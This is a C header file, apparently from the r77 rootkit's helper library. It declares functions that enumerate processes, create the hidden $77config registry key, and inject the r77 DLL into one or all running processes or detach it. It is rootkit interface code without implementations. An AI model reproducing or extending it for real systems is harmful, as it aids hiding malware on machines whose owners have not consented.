#include "r77mindef.h"

typedef struct _PROCESS_LIST_ENTRY
{
	DWORD ProcessId;
	WCHAR Name[MAX_PATH];
	WCHAR FullName[MAX_PATH];
	LONG Platform;
	DWORD IntegrityLevel;
	WCHAR UserName[MAX_PATH];
	BOOL IsInjected;
	BOOL IsR77Service;
	BOOL IsHelper;
	BOOL IsHiddenById;
} PROCESS_LIST_ENTRY, *PPROCESS_LIST_ENTRY;

BOOL WINAPI DllMain(_In_ HINSTANCE module, _In_ DWORD reason, _In_ LPVOID reserved);

/// <summary>
/// Gets a list of all processes.
/// </summary>
/// <param name="entries">A buffer to write the process list to.</param>
/// <param name="count">A pointer to write the number of written processes to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
__declspec(dllexport) BOOL GetProcessList(PPROCESS_LIST_ENTRY entries, LPDWORD count);
/// <summary>
/// Creates the registry key HKLM\SOFTWARE\$77config, if it does not exist.
/// </summary>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
__declspec(dllexport) BOOL CreateConfigSystem();
/// <summary>
/// Injects r77 into a specific process.
/// </summary>
/// <param name="processId">The process ID to inject.</param>
/// <param name="dll">A buffer with the DLL file to inject. The bitness of the DLL must match the bitness of the injected process.</param>
/// <param name="dllSize">The size of the DLL file.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
__declspec(dllexport) BOOL Inject(DWORD processId, LPBYTE dll, DWORD dllSize);
/// <summary>
/// Injects all processes with the r77 DLL.
/// </summary>
/// <param name="dll32">The r77-x86.dll file.</param>
/// <param name="dll32Size">The size of the r77-x86.dll file.</param>
/// <param name="dll64">The r77-x64.dll file.</param>
/// <param name="dll64Size">The size of the r77-x64.dll file.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
__declspec(dllexport) BOOL InjectAll(LPBYTE dll32, DWORD dll32Size, LPBYTE dll64, DWORD dll64Size);
/// <summary>
/// Detaches r77 from the specific process.
/// </summary>
/// <param name="processId">The process ID to detach r77 from.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
__declspec(dllexport) BOOL Detach(DWORD processId);
/// <summary>
/// Detaches r77 from all running processes.
/// </summary>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
__declspec(dllexport) BOOL DetachAll();